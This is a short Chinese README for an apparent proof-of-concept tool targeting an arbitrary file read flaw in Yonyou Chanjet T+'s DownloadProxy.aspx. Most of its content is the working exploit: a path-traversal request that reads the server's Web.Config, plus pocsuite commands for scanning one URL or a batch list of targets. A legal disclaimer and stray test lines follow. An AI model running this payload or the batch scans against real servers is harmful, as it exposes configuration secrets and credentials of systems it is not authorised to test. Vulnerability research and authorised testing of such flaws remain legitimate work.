#  用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞

## 1.漏洞描述

用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 2.漏洞影响

用友 畅捷通T+

## 3.漏洞检测

单个检测：pocsuite -r "T+.py" -u url

批量检测：pocsuite -r "T+.py" -f 1.txt --verify

## 4.漏洞验证

```
poc：/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

## 免责声明🧐

本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建测试环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。# test
# -T-
